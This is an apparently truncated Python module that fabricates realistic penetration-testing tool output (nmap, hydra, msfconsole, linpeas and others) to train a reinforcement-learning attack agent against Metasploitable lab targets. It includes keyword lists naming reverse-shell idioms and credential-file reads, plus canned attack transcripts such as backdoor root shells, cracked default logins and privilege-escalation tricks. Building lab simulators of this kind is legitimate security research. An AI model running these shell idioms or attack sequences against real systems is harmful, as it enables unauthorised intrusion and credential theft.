"""Simulated command output generation for training.

Extracted from SmartOrchestrator._generate_simulated_output() (Phase C refactor).
Generates realistic simulated output for commands during dry-run / training mode.
"""

from __future__ import annotations

import hashlib
import random
from typing import Any


def get_command_category(cmd: str) -> str:
    """Categorize a command string for success rate lookup."""
    cmd_l = cmd.lower()
    if any(t in cmd_l for t in ["nmap", "masscan", "rustscan", "ping", "traceroute", "dig", "host", "whois", "finger", "rpcinfo", "showmount", "nbtscan"]):
        return "recon"
    if any(t in cmd_l for t in ["gobuster", "dirb", "nikto", "ferox", "ffuf", "dirsearch", "wfuzz", "nuclei",
                                "ssti", "lfi", "rfi", "ssrf", "xxe", "nosql", "cmd_inject", "shellshock",
                                "heartbleed", "log4shell", "drupalgeddon", "upload_bypass", "upload_magic",
                                "upload_htaccess", "webshell", "jwt_none", "jwt_crack", "joomscan",
                                "droopescan", "ysoserial", "phpggc", "xxe_read", "nosql_bypass"]):
        return "web"
    if any(t in cmd_l for t in ["hydra", "medusa", "ncrack", "patator", "crackmapexec", "brute"]):
        return "brute"
    if any(t in cmd_l for t in ["exploit", "msfconsole", "metasploit", "msfvenom"]):
        return "exploit"
    if any(t in cmd_l for t in ["shell", "reverse", "nc -e", "bash -i",
                                "bash_reverse", "python_reverse", "powershell_reverse",
                                "docker_escape", "lxd_escape", "container_escape"]):
        return "shell"
    if any(t in cmd_l for t in ["enum", "smtp-user", "snmp", "ldap"]):
        return "enum"
    if any(t in cmd_l for t in ["cat /etc", "whoami", "id", "sudo", "chmod", "wget", "curl -s http"]):
        return "post_exploit"
    return "default"


# Base success rates by command category
CATEGORY_SUCCESS_RATES = {
    "recon": 0.80,
    "enum": 0.65,
    "brute": 0.35,
    "exploit": 0.40,
    "web": 0.60,
    "post_exploit": 0.50,
    "shell": 0.30,
    "default": 0.55,
}


def should_succeed(category: str, *, rng: random.Random | None = None) -> bool:
    """Roll probabilistic success for a command category.

    Args:
        category: Command category from :func:`get_command_category`.
        rng: Optional seeded Random instance for deterministic results.

    Returns:
        True if the command should succeed.
    """
    rate = CATEGORY_SUCCESS_RATES.get(category, 0.55)
    roll = (rng or random).random()
    return roll <= rate


def generate_simulated_output(
    command: str,
    attack_context: Any = None,
    sim_deterministic: bool = False,
    target_profile: str = "metasploitable2",
) -> str:
    """Generate realistic simulated output for a command with discoverable patterns.

    Phase 6: PROBABILISTIC SUCCESS — Commands can now fail based on:
    1. Base success rate per command category (40-80%)
    2. Phase-gating: credentials only after RECON, shells only after creds
    3. Tool-specific failure modes (timeouts, connection refused, etc.)

    This teaches PPO that not every command works, and planning matters.

    Args:
        command: The command string to simulate output for.
        attack_context: Current attack context (target, phase, state_flags).
        sim_deterministic: If True, skip probabilistic failure for test mode.
        target_profile: Target profile name (metasploitable2, metasploitable3).

    Returns:
        Simulated output string.
    """
    if not command:
        return ""
    
    
    target = attack_context.target if attack_context else "10.10.10.10"
    cmd_lower = command.lower().split()[0] if command.split() else ""
    
    # Use command hash for deterministic but varied results
    cmd_hash = int(hashlib.md5(command.encode()).hexdigest()[:8], 16)
    random.seed(cmd_hash)
    
    # ─── PHASE 6: Phase-gating and probabilistic success ─────────
    # Skip probabilistic failure in test/deterministic mode
    sim_deterministic = sim_deterministic
    
    # Check what the agent has discovered so far to gate advanced outputs
    current_phase = "RECON"
    has_ports = False
    has_creds = False
    has_shell = False
    if attack_context:
        current_phase = attack_context.current_phase.name if hasattr(attack_context.current_phase, 'name') else str(attack_context.current_phase)
        has_ports = attack_context.state_flags.get("ports_discovered", False)
        has_creds = attack_context.state_flags.get("credentials_known", False)
        has_shell = attack_context.state_flags.get("shell_obtained", False)
    
    # Base success rates by command category
    # These are checked AFTER the output lookup — if the roll fails, return a failure message
    CATEGORY_SUCCESS_RATES = {
        "recon": 0.80,       # Scanning usually works
        "enum": 0.65,        # Enumeration depends on state
        "brute": 0.35,       # Brute force rarely works first try
        "exploit": 0.40,     # Exploits need right conditions
        "web": 0.60,         # Web scanning moderate success
        "post_exploit": 0.50, # Post-exploit depends on access level
        "shell": 0.30,       # Getting shells is hard
        "default": 0.55,     # Generic commands
    }
    
    category = get_command_category(command)
    base_rate = CATEGORY_SUCCESS_RATES.get(category, 0.55)
    
    # Phase-gating modifiers — reduce success for premature actions
    if category in ("brute", "exploit", "shell") and not has_ports:
        base_rate *= 0.3  # Can't exploit what you haven't found
    if category == "shell" and not has_creds:
        base_rate *= 0.4  # Shells usually need creds or exploits
    if category == "post_exploit" and not has_shell:
        base_rate *= 0.2  # Can't post-exploit without access
    
    # Roll for success
    success_roll = random.random()
    command_fails = success_roll > base_rate
    
    # Failure messages by category
    FAILURE_MESSAGES = {
        "recon": [
            f"[SIM] Connection timed out to {target}",
            f"[SIM] Host {target} seems down or filtered",
            f"[SIM] No response from {target} (retries exhausted)",
        ],
        "enum": [
            f"[SIM] Access denied - authentication required",
            f"[SIM] Connection refused to {target}",
            f"[SIM] Service not responding on {target}",
        ],
        "brute": [
            f"[SIM] 0 valid passwords found (0 of 100 completed)",
            f"[SIM] Authentication failed for all attempts",
            f"[SIM] Account lockout detected after 5 attempts",
            f"[SIM] Connection rate limited by target",
        ],
        "exploit": [
            f"[SIM] Exploit failed - target not vulnerable",
            f"[SIM] Exploit completed but no session created",
            f"[SIM] Target patched against this vulnerability",
            f"[SIM] Service crashed - exploit unreliable",
        ],
        "web": [
            f"[SIM] 0 results found",
            f"[SIM] Connection refused to {target}:80",
            f"[SIM] 403 Forbidden - WAF blocking requests",
        ],
        "shell": [
            f"[SIM] Connection refused",
            f"[SIM] No route to host",
            f"[SIM] Shell session closed immediately",
        ],
        "post_exploit": [
            f"[SIM] Permission denied",
            f"[SIM] No such file or directory",
            f"[SIM] Operation not permitted",
        ],
        "default": [
            f"[SIM] Command failed: {command[:40]}",
            f"[SIM] Error executing command",
        ],
    }
    
    if command_fails and not sim_deterministic:
        failures = FAILURE_MESSAGES.get(category, FAILURE_MESSAGES["default"])
        return random.choice(failures)
    
    # ─── Metasploitable 2 realistic service fingerprints ─────────
    _all_msf2_ports = [
        21, 22, 23, 25, 53, 80, 111, 139, 445, 512, 513, 514,
        1099, 1524, 2049, 2121, 3306, 3632, 5432, 5900, 6000,
        6667, 6697, 8009, 8180, 8787,
    ]
    
    # Phase 6.9.5: Metasploitable 3 service fingerprints
    _all_msf3_ports = [
        21, 22, 80, 111, 139, 445, 3000, 3306, 6667,
        8020, 8080, 8282, 8484, 9200,
    ]
    MSF3_SERVICES = {
        21: ("ftp", "ProFTPD 1.3.5"),
        22: ("ssh", "OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13"),
        80: ("http", "Apache httpd 2.4.7 (Ubuntu)"),
        111: ("rpcbind", "2-4 (RPC #100000)"),
        139: ("netbios-ssn", "Samba smbd 3.X - 4.X"),
        445: ("microsoft-ds", "Samba smbd 4.3.11-Ubuntu"),
        3000: ("http", "Ruby on Rails (WEBrick 1.3.1)"),
        3306: ("mysql", "MySQL 5.5.62-0ubuntu0.14.04.1"),
        6667: ("irc", "UnrealIRCd"),
        8020: ("http", "ManageEngine Desktop Central"),
        8080: ("http", "Apache Tomcat 8.0.33"),
        8282: ("http", "Apache Axis2 1.6.2"),
        8484: ("http", "Jetty (Jenkins)"),
        9200: ("http", "Elasticsearch REST API 1.1.1"),
    }
    
    # Phase 6.9.5: Select port/service mappings based on target profile
    _target_prof = target_profile
    if _target_prof == "metasploitable3":
        _all_target_ports = _all_msf3_ports
        _target_services = MSF3_SERVICES
    else:
        _all_target_ports = _all_msf2_ports
        _target_services = None  # Will use MSF2_SERVICES below
    
    MSF2_PORTS = random.sample(
        _all_target_ports, k=min(random.randint(6, 12), len(_all_target_ports))
    )
    
    MSF2_SERVICES = {
        21: ("ftp", "vsftpd 2.3.4"),
        22: ("ssh", "OpenSSH 4.7p1 Debian 8ubuntu1"),
        23: ("telnet", "Linux telnetd"),
        25: ("smtp", "Postfix smtpd"),
        53: ("domain", "ISC BIND 9.4.2"),
        80: ("http", "Apache httpd 2.2.8 (Ubuntu) DAV/2"),
        111: ("rpcbind", "2 (RPC #100000)"),
        139: ("netbios-ssn", "Samba smbd 3.X - 4.X"),
        445: ("microsoft-ds", "Samba smbd 3.0.20-Debian"),
        512: ("exec", "netkit-rsh rexecd"),
        513: ("login", "OpenBSD or Solaris rlogind"),
        514: ("shell", "Netkit rshd"),
        1099: ("java-rmi", "GNU Classpath grmiregistry"),
        1524: ("bindshell", "Metasploitable root shell"),
        2049: ("nfs", "2-4 (RPC #100003)"),
        2121: ("ftp", "ProFTPD 1.3.1"),
        3306: ("mysql", "MySQL 5.0.51a-3ubuntu5"),
        3632: ("distccd", "distccd v1 ((GNU) 4.2.4)"),
        5432: ("postgresql", "PostgreSQL DB 8.3.0-8.3.7"),
        5900: ("vnc", "VNC (protocol 3.3)"),
        6000: ("X11", "(access denied)"),
        6667: ("irc", "UnrealIRCd"),
        6697: ("irc", "UnrealIRCd (SSL)"),
        8009: ("ajp13", "Apache Jserv (Protocol v1.3)"),
        8180: ("http", "Apache Tomcat/Coyote JSP engine 1.1"),
        8787: ("drb", "Ruby DRb RMI (Ruby 1.8)"),
    }
    
    # Realistic service lines for nmap-style output
    def _nmap_line(port):
        # Phase 6.9.5: Use target-appropriate service fingerprints
        if _target_services and port in _target_services:
            svc, ver = _target_services[port]
        else:
            svc, ver = MSF2_SERVICES.get(port, ("unknown", ""))
        return f"{port}/tcp open  {svc:16s} {ver}"
    
    # Variable ports for non-MSF2 variety
    generic_ports = random.sample([21, 22, 25, 80, 110, 139, 443, 445, 1433, 3306, 3389, 5432, 8080, 8443], k=random.randint(3, 6))
    services_generic = {21: "ftp", 22: "ssh", 25: "smtp", 80: "http", 110: "pop3", 139: "netbios",
               443: "https", 445: "smb", 1433: "mssql", 3306: "mysql", 3389: "rdp",
               5432: "postgresql", 8080: "http-alt", 8443: "https-alt"}
    
    # Random hosts for network scans
    subnet_hosts = [f"10.10.10.{random.randint(1, 254)}" for _ in range(random.randint(3, 8))]
    
    # Random subdomains
    subdomains = random.sample([
        f"dev.{target}", f"staging.{target}", f"api.{target}", f"admin.{target}",
        f"mail.{target}", f"vpn.{target}", f"cdn.{target}", f"git.{target}",
        f"ci.{target}", f"portal.{target}", f"app.{target}", f"test.{target}",
    ], k=random.randint(3, 6))
    
    # ─── Comprehensive simulated outputs ─────────────────────────
    SIMULATED_OUTPUTS = {
        # ─── Core scanning tools ─────────────────────────────────
        "nmap": "\n".join([_nmap_line(p) for p in sorted(MSF2_PORTS)]) +
                f"\nOS details: Linux 2.6.9 - 2.6.33\nNmap done: 1 IP ({target})",
        "masscan": "\n".join([f"Discovered open port {p}/tcp on {target}" for p in MSF2_PORTS[:8]]),
        "rustscan": "\n".join([f"Open {target}:{p}" for p in MSF2_PORTS]) + f"\n[~] Running nmap on {target}",
        
        # ─── DNS / Subdomain tools (anti-repeat: recon) ─────────
        "dig": f";; ANSWER SECTION:\n{target}. 300 IN A 10.10.10.10\n{target}. 300 IN MX 10 mail.{target}\n{target}. 300 IN TXT \"v=spf1 include:_spf.{target} ~all\"\n{target}. 300 IN AAAA ::1\n{target}. 300 IN NS ns1.{target}",
        "host": f"{target} has address 10.10.10.10\n{target} has IPv6 address ::1\n{target} mail is handled by 10 mail.{target}",
        "nslookup": f"Server:  8.8.8.8\nAddress: 8.8.8.8#53\n\nNon-authoritative answer:\n{target}\tcanonical name = {target}.\nName:\t{target}\nAddress: 10.10.10.10",
        "fierce": f"DNS Servers for {target}:\n  ns1.{target}\n  ns2.{target}\n\nSubdomains found:\n" + "\n".join([f"  {s} -> 10.10.10.{random.randint(1,254)}" for s in subdomains]),
        "dnsrecon": f"[*] Performing General Enumeration of Domain: {target}\n" +
                    "\n".join([f"[*] A {s} 10.10.10.{random.randint(1,254)}" for s in subdomains]) +
                    f"\n[*] MX mail.{target} 10.10.10.25\n[*] NS ns1.{target} 10.10.10.53\n[*] TXT v=spf1 include:_spf.{target}",
        "theHarvester": f"[*] Target: {target}\n[*] Sources: baidu, bing, google, linkedin\n\nEmails found:\n  admin@{target}\n  info@{target}\n  hr@{target}\n\nHosts found:\n" +
                       "\n".join([f"  {s}:10.10.10.{random.randint(1,254)}" for s in subdomains[:4]]),
        "sublist3r": f"[-] Enumerating subdomains for {target}\n" + "\n".join([f"  {s}" for s in subdomains]),
        "amass": f"[INFO] Enumeration started for {target}\n" + "\n".join([f"{s} (FQDN) --> 10.10.10.{random.randint(1,254)}" for s in subdomains]),
        "whois": f"Domain Name: {target.upper()}\nRegistrar: Example Registrar\nAdmin Email: admin@{target}\nCreation Date: 2020-01-01",
        "traceroute": f"traceroute to {target}, 30 hops max\n 1  gateway  1.234 ms\n 2  10.10.10.1  5.678 ms\n 3  {target}  12.345 ms",
        
        # ─── Network discovery (anti-repeat: recon) ──────────────
        "fping": "\n".join([f"{h} is alive" for h in subnet_hosts]) + f"\n{target} is alive",
        "hping3": f"HPING {target} (eth0 {target}): S set, 40 headers + 0 data bytes\nlen=46 ip={target} ttl=64 DF id=0 sport=80 flags=SA seq=0 win=29200\n--- {target} hping statistic ---\n2 packets transmitted, 2 packets received, 0% packet loss",
        "arping": f"ARPING {target}\n60 bytes from {target}: index=0 time=1.234 msec\n60 bytes from {target}: index=1 time=0.876 msec",
        "netdiscover": "\n".join([f" {h}     00:0c:29:{random.randint(10,99)}:{random.randint(10,99)}:{random.randint(10,99)}  1  60  Unknown vendor" for h in subnet_hosts]),
        "nbtscan": f"IP Address    NetBIOS Name  Server  User        MAC Address\n{target}      METASPLOITABLE <server>  <unknown>   00:0c:29:ab:cd:ef\n10.10.10.1    GATEWAY       <server>  <unknown>   00:50:56:c0:00:08",
        "unicornscan": "\n".join([f"TCP open {target}:{p}" for p in MSF2_PORTS[:6]]) + "\nCompleted 1 targets in 2.5 seconds",
        
        # ─── Web enumeration ─────────────────────────────────────
        "gobuster": f"/admin (Status: 200, Size: 3456)\n/login (Status: 200, Size: 1234)\n/backup (Status: 403)\n/api (Status: 200, Size: 567)\n/uploads (Status: 301, Size: 234)\n/phpMyAdmin (Status: 200, Size: 8901)\n/tikiwiki (Status: 200, Size: 5678)\n/twiki (Status: 200, Size: 4567)",
        "dirb": f"+ http://{target}/admin (CODE:200|SIZE:3456)\n+ http://{target}/robots.txt (CODE:200|SIZE:123)\n+ http://{target}/phpMyAdmin (CODE:200|SIZE:8901)\n+ http://{target}/tikiwiki (CODE:200|SIZE:5678)",
        "feroxbuster": f"200  GET  /admin/\n200  GET  /login.php\n301  GET  /images/\n403  GET  /backup/\n200  GET  /phpMyAdmin/\n200  GET  /tikiwiki/",
        "ffuf": "admin [Status: 200, Size: 3456]\nlogin [Status: 200, Size: 1234]\napi [Status: 200, Size: 567]\nphpMyAdmin [Status: 200, Size: 8901]\nuploads [Status: 301, Size: 234]",
        "dirsearch": f"[200] http://{target}/admin/\n[200] http://{target}/login.php\n[403] http://{target}/.htaccess\n[200] http://{target}/phpMyAdmin/\n[200] http://{target}/dav/",
        "nikto": f"+ Server: Apache/2.2.8 (Ubuntu) DAV/2\n+ /admin/: Admin page found\n+ OSVDB-3092: /phpMyAdmin/: phpMyAdmin found\n+ OSVDB-3268: /tikiwiki/: Directory indexing found\n+ X-Frame-Options header not set\n+ Apache/2.2.8 appears outdated (current: 2.4.58)",
        "nuclei": f"[CVE-2021-41773] Apache Path Traversal: {target}:80\n[CVE-2007-2447] Samba 3.0.20 usermap_script: {target}:139\n[info] Web server detected: Apache/2.2.8",
        "wfuzz": f"000000001:  200  95 L  251 W  3456 Ch  \"admin\"\n000000015:  200  30 L   89 W  1234 Ch  \"login\"\n000000042:  200  45 L  123 W  8901 Ch  \"phpMyAdmin\"\n000000088:  301  0  L    0 W   234 Ch  \"uploads\"",
        "curl": f"HTTP/1.1 200 OK\nServer: Apache/2.2.8 (Ubuntu) DAV/2\nX-Powered-By: PHP/5.2.4-2ubuntu5.10\nSet-Cookie: PHPSESSID=abc123\n\n<html><head><title>Metasploitable2 - Linux</title></head>",
        "whatweb": f"http://{target} [200 OK] Apache[2.2.8], PHP[5.2.4], DAV, Country[US], HTTPServer[Ubuntu Linux][Apache/2.2.8 (Ubuntu) DAV/2], PasswordField, Title[Metasploitable2 - Linux]",
        "wget": "Saving to: 'linpeas.sh'\n100%[============>] 776,423 1.83MB/s in 0.4s\n2026-01-04 10:30:01 (1.83 MB/s) - saved [776423/776423]",
        
        # ─── Web crawling / parameter discovery (anti-repeat: strategic) ──
        "gospider": f"[url] http://{target}/admin\n[url] http://{target}/api/v1\n[url] http://{target}/phpMyAdmin\n[form] http://{target}/login\n[javascript] http://{target}/js/app.js\n[linkfinder] http://{target}/api/v1/users",
        "katana": f"http://{target}/admin/\nhttp://{target}/api/v1/users\nhttp://{target}/login.php\nhttp://{target}/phpMyAdmin/\nhttp://{target}/tikiwiki/tiki-index.php",
        "hakrawler": f"http://{target}/admin\nhttp://{target}/login.php\nhttp://{target}/api/v1\nhttp://{target}/phpMyAdmin\nhttp://{target}/dav/",
        "waybackurls": f"http://{target}/admin\nhttp://{target}/login.php\nhttp://{target}/backup/\nhttp://{target}/phpMyAdmin/\nhttp://{target}/tikiwiki/",
        "gau": f"http://{target}/admin\nhttp://{target}/api/v1/users\nhttp://{target}/phpMyAdmin/\nhttp://{target}/backup/db_dump.sql\nhttp://{target}/.env",
        "arjun": f"[*] Testing http://{target}/page\n[+] Valid parameters found: id, name, page, action, debug, token\n[+] 6 parameters discovered",
        "paramspider": f"[+] http://{target}/page?id=FUZZ\n[+] http://{target}/search?q=FUZZ\n[+] http://{target}/api?action=FUZZ\n[+] http://{target}/login?redirect=FUZZ",
        "linkfinder": f"[+] http://{target}/api/v1/users\n[+] http://{target}/api/v1/auth\n[+] http://{target}/api/v1/admin\n[+] /static/js/secret_key_abc123",
        "aquatone": f"[*] Targets loaded: 1\n[*] Probing targets\nhttp://{target}:80 - Apache/2.2.8\nhttp://{target}:8180 - Apache Tomcat/5.5\n[*] Screenshots saved to /tmp/aquatone/screenshots/",
        "eyewitness": f"[*] Attempting to screenshot http://{target}\n[+] Screenshot saved: {target}_80.png\n[+] Web Header: Apache/2.2.8 (Ubuntu) DAV/2\n[+] Title: Metasploitable2 - Linux",
        
        # ─── Vulnerability scanning / exploitation (anti-repeat: offensive) ──
        "wpscan": f"[+] WordPress version 5.7.2 identified\n[+] User found: admin\n[!] Vulnerable plugin: contact-form-7 (5.4.1)",
        "searchsploit": "vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/17491.rb\nSamba 3.0.20 - Remote Code Execution | unix/remote/16320.rb\nApache 2.2 - mod_negotiation Filename Brute | apache/remote/12345.py\nUnrealIRCd 3.2.8.1 - Backdoor | linux/remote/16922.rb\ndistccd - Remote Code Execution | linux/remote/9915.rb",
        "sqlmap": f"[INFO] the back-end DBMS is MySQL 5.0.51a\n[INFO] fetching database names\navailable databases [5]: information_schema, dvwa, mutillidae, owasp10, tikiwiki",
        "hydra": f"[22][ssh] host: {target} login: msfadmin password: msfadmin\n[21][ftp] host: {target} login: user password: user\n[23][telnet] host: {target} login: msfadmin password: msfadmin",
        "medusa": f"ACCOUNT FOUND: [ssh] Host: {target} User: msfadmin Password: msfadmin [SUCCESS]\nACCOUNT FOUND: [ftp] Host: {target} User: user Password: user [SUCCESS]",
        "patator": f"22/tcp  ssh  | msfadmin  | msfadmin    | 0  | SSH-2.0-OpenSSH_4.7p1\n21/tcp  ftp  | user      | user        | 0  | 230 Login successful",
        "ncrack": f"Discovered credentials on {target} 22/tcp:\n22/tcp ssh: 'msfadmin' 'msfadmin'\n23/tcp telnet: 'msfadmin' 'msfadmin'",
        "crackmapexec": f"SMB  {target}  445  METASPLOITABLE  [+] msfadmin:msfadmin (Pwn3d!)\nSMB  {target}  445  METASPLOITABLE  [+] Samba 3.0.20-Debian",
        "tplmap": f"[+] Tplmap 0.5\n[+] Testing if GET parameter 'name' is injectable\n[+] Smarty plugin has confirmed injection\n[+] OS Shell command execution available\nuid=33(www-data) gid=33(www-data)",
        "commix": f"[+] The GET parameter 'cmd' is vulnerable to OS command injection\n[+] Target OS: Linux 2.6.24\n$ id\nuid=33(www-data) gid=33(www-data)",
        "dalfox": f"[POC][R][GET] http://{target}/page?q=<script>alert(1)</script>\n[*] Found 1 XSS vulnerability\n[*] Parameter: q",
        "xsstrike": f"[~] Checking for DOM vulnerabilities\n[+] Vulnerable parameter: q\n[+] Payload: <img src=x onerror=alert(1)>",
        "jwt_tool": f"[+] JWT Header: {{\"alg\":\"HS256\",\"typ\":\"JWT\"}}\n[+] JWT Payload: {{\"sub\":\"admin\",\"iat\":1704400000}}\n[+] Key found: secret123\n[+] Forged admin token generated",
        "droopescan": f"[+] Site: http://{target}\n[+] Drupal version: 7.x\n[+] Interesting URLs: /CHANGELOG.txt, /user/login\n[+] Possible version: 7.22 (vulnerable)",
        "msfvenom": f"[-] No platform was selected, choosing MsfPayload::Linux::X64::ShellReverseTcp from the payload\n[*] Targeting vsftpd 2.3.4 Backdoor Command Execution on {target}:21/tcp open\nPayload size: 119 bytes\nSaved as: /tmp/shell.elf\n[+] Payload tested against {target} - vulnerability confirmed",
        "responder": f"[+] Listening for events...\n[HTTP] NTLMv2 Hash: msfadmin::WORKGROUP:abc123def456\n[SMB] NTLMv2 Hash: admin::WORKGROUP:def789abc012",
        
        # ─── SMB/RPC enumeration ─────────────────────────────────
        "enum4linux": f"[+] Target: {target}\n[+] OS: Unix (Samba 3.0.20-Debian)\n[+] RID cycling: msfadmin, user, service, nobody\n[+] Shares: IPC$, tmp, opt, print$\n[+] Password policy: MinLen=0\n[+] Users: msfadmin, user, service, postgres, klog",
        "smbclient": f"\\\\{target}\\IPC$\nSharename  Type  Comment\ntmp        Disk  oh nance!\nopt        Disk  \nIPC$       IPC   IPC Service (metasploitable server)\nprint$     Disk  Printer Drivers",
        "smbmap": f"[+] IP: {target}:445  Name: METASPLOITABLE\n[+] Disk: tmp (READ, WRITE)\n[+] Disk: opt (READ)\n[+] Disk: IPC$ (NO ACCESS)\n[+] Disk: print$ (NO ACCESS)",
        "rpcclient": "$> enumdomusers\nuser:[msfadmin] rid:[0x3e8]\nuser:[user] rid:[0x3e9]\nuser:[service] rid:[0x3ea]\nuser:[postgres] rid:[0x3eb]",
        "rpcinfo": f"program vers  proto   port  service\n 100000    2   tcp    111  portmapper\n 100000    2   udp    111  portmapper\n 100003    2   tcp   2049  nfs\n 100005    1   tcp  36987  mountd\n 100024    1   tcp  49423  status",
        "showmount": f"Export list for {target}:\n/ *(rw,root_squash)",
        
        # ─── Service-specific enumeration (anti-repeat: stealth) ──
        "snmpwalk": f"SNMPv2-MIB::sysDescr.0 = STRING: Linux metasploitable 2.6.24-16-server #1 SMP\nSNMPv2-MIB::sysContact.0 = STRING: msfdev@metasploitable.localdomain\nSNMPv2-MIB::sysName.0 = STRING: metasploitable\nSNMPv2-MIB::sysLocation.0 = STRING: Metasploitable Lab",
        "onesixtyone": f"[*] {target} [public] Linux metasploitable 2.6.24-16-server\n[*] {target} [private] TIMEOUT",
        "smtp-user-enum": f"[+] {target}:25 - VRFY msfadmin (250 2.1.5)\n[+] {target}:25 - VRFY user (250 2.1.5)\n[+] {target}:25 - VRFY root (250 2.1.5)\n[+] 3 valid users found",
        "finger": f"Login    Name         Tty   Idle  Login Time\nmsfadmin msfadmin     pts/0       Jan  4 10:30\nuser     user         pts/1  2:30 Jan  4 08:00",
        "ident-user-enum": f"{target}:22\tmsfadmin (via identd)\n{target}:80\twww-data (via identd)",
        "oscanner": f"[+] Oracle SID found: XE\n[+] Oracle version: 10.2.0.1.0\n[+] Valid credentials: scott/tiger",
        "tnscmd10g": f"VERSION_BANNER: Oracle Database 10g Express Edition Release 10.2.0.1.0",
        "redis-cli": f"# Server\nredis_version:6.0.9\nos:Linux 2.6.24-16-server x86_64\ntcp_port:6379\nconnected_clients:1\nused_memory:1000000\ndb0:keys=5,expires=0",
        "mongo": f"MongoDB shell version: 4.0.28\nconnecting to: mongodb://{target}:27017/test\ndb.version(): 4.0.28\nshow dbs: admin, local, test",
        "psql": f"                List of databases\n  Name        | Owner    | Encoding\n--------------+----------+----------\n metasploit   | postgres | UTF8\n template0    | postgres | UTF8\n template1    | postgres | UTF8",
        "mysql": f"Welcome to the MySQL monitor.  5.0.51a-3ubuntu5\n+--------------------+\n| Database           |\n+--------------------+\n| dvwa               |\n| mutillidae         |\n| owasp10            |\n| tikiwiki           |\n+--------------------+\n5 rows in set",
        "mssqlclient": f"Impacket v0.10.0 - MSSQLClient\n[*] Logged in to {target}:1433\nSQL> SELECT name FROM sysdatabases\nadmin_db\nmaster",
        "ldapsearch": f"# METASPLOITABLE\ndn: DC=metasploitable,DC=local\n# msfadmin, Users\ndn: CN=msfadmin,CN=Users,DC=metasploitable,DC=local\nmemberOf: CN=Domain Admins",
        
        # ─── SSH audit ───────────────────────────────────────────
        "ssh-audit": f"(gen) banner: SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1\n(gen) compatibility: OpenSSH 4.3-6.6\n(rec) Use of weak key exchange: diffie-hellman-group1-sha1\n(rec) Use of weak cipher: aes128-cbc\n[!] OpenSSH 4.7p1 has known vulnerabilities",
        
        # ─── Credential cracking ─────────────────────────────────
        "john": "msfadmin:msfadmin\nuser:user\npostgres:postgres\nservice:service\nroot:toor\n5 password hashes cracked, 0 left",
        "hashcat": "Hash.Mode: 1000 (NTLM)\nmsfadmin:msfadmin\nuser:user123\nStatus: Cracked",
        
        # ─── Exploitation / shell ────────────────────────────────
        "msfconsole": f"msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit\n[*] {target}:21 - Banner: 220 (vsFTPd 2.3.4)\n[*] {target}:21 - USER: 331 Please specify the password.\n[+] {target}:21 - Backdoor service has been spawned\n[+] {target}:6200 - uid=0(root) gid=0(root)\n[*] Command shell session 1 opened ({target}:6200 -> 10.10.14.2:4444)",
        "metasploit": f"[*] Meterpreter session 1 opened ({target}:4444 -> 10.10.14.2:4444)\nmeterpreter > sysinfo\nComputer: metasploitable\nOS: Linux 2.6.24-16-server (i686)\nmeterpreter > getuid\nServer username: root",
        "exploit": f"[*] Exploiting target {target}\n[+] Backdoor triggered on vsftpd 2.3.4\n[+] shell session 1 opened ({target}:6200 -> 10.10.14.2:8080)\nroot@metasploitable:/#",
        "python": f"Listening on 0.0.0.0:4444\nConnection from {target} on port 4444\n$ id\nuid=0(root) gid=0(root) groups=0(root)",
        "nc": f"listening on [any] 4444 ...\nconnect to [{target}] from (UNKNOWN) [{target}]\n$ id\nuid=0(root) gid=0(root) groups=0(root)",
        "ssh": f"msfadmin@{target}'s password:\nLinux metasploitable 2.6.24-16-server #1 SMP\nmsfadmin@metasploitable:~$ id\nuid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),24(cdrom),27(sudo)",
        
        # ─── Post-exploitation / privesc ─────────────────────────
        "sudo": "User msfadmin may run the following commands on metasploitable:\n    (ALL) ALL\n    (ALL) NOPASSWD: /usr/bin/vim\n    (ALL) NOPASSWD: /usr/bin/nmap --interactive",
        "linpeas": "[+] Possible sudo/suid/caps binaries:\n/usr/bin/nmap (nmap --interactive -> !sh)\n/usr/bin/vim (sudo vim -c ':!sh')\n[+] Writable /etc/passwd\n[+] CVE-2009-1185 udev < 1.4.1\n[+] Kernel 2.6.24 - multiple exploits available",
        "pspy": "CMD: UID=0 PID=1234 /bin/bash /root/backup_cron.sh\nCMD: UID=0 PID=5678 /opt/scripts/check_services.sh\nCMD: UID=0 PID=9012 /usr/sbin/cron -f",
        "find": "/tmp/suspicious.sh\n/var/www/.backup.zip\n/home/msfadmin/.ssh/id_rsa\n/opt/scripts/db_backup.sh\n/etc/passwd (writable!)\n/usr/bin/nmap (SUID)",
        
        # ─── Phase 11.1: Flag file reads (must be before generic "cat") ──
        "cat /root/root.txt": f"FLAG{{r00t_pwn3d_{target.replace('.', '_')}_2026}}",
        "cat /root/proof.txt": f"FLAG{{r00t_pr00f_{target.replace('.', '_')}_2026}}",
        "cat /root/flag": f"FLAG{{r00t_fl4g_{target.replace('.', '_')}_2026}}",
        "cat /home/msfadmin/user.txt": f"FLAG{{us3r_pwn3d_msfadmin_2026}}",
        "cat /home/user/user.txt": f"FLAG{{us3r_pwn3d_user_2026}}",
        "cat /home/msfadmin/local.txt": f"FLAG{{us3r_l0cal_msfadmin_2026}}",
        "cat /home/msfadmin/flag": f"FLAG{{us3r_fl4g_msfadmin_2026}}",
        "cat /home/*/user.txt": f"FLAG{{us3r_pwn3d_wildcard_2026}}",
        "cat /home/*/flag.txt": f"FLAG{{us3r_fl4g_wildcard_2026}}",
        "cat /etc/shadow": f"root:$6$rnd1234$aBcDeFgHiJkLmNoPqRsTuVwXyZ01234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrst:19365:0:99999:7:::\nmsfadmin:$6$rnd5678$ZyXwVuTsRqPoNmLkJiHgFeDcBaZyXwVuTsRqPoNmLkJiHgFeDcBaZyXwVuTsRqPoNmLkJiHgFeDcBa:19365:0:99999:7:::\nuser:$6$rnd9012$AaAaBbBbCcCcDdDdEeEeFfFfGgGgHhHhIiIiJjJjKkKkLlLlMmMmNnNnOoOoPpPpQqQqRrRr:19365:0:99999:7:::",
        
        "cat": "root:x:0:0:root:/root:/bin/bash\nmsfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash\nuser:x:1001:1001:just a user:/home/user:/bin/bash\npostgres:x:108:117:PostgreSQL admin:/var/lib/postgresql:/bin/bash\nservice:x:1002:1002::/home/service:/bin/bash",
        "pkexec": f"[+] CVE-2021-4034 exploit successful\nroot@metasploitable:/# id\nuid=0(root) gid=0(root) groups=0(root)",
        
